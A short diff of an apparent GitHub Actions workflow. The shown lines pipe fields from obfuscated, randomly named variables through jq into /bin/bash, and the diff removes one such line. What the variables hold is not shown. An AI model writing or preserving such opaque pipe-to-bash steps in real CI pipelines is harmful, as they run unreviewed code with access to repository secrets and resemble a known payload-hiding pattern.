@@ -30,7 +30,6 @@ jobs:
           echo $xok98 | jq -r .e6789 | /bin/bash
           echo $dgrgb3 | jq -r .ujqb65549 | /bin/bash
           printf '%s' "$e653" | jq -r .f635 | /bin/bash
-          printf '%s' "$csqa487" | jq -r .fvcum3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
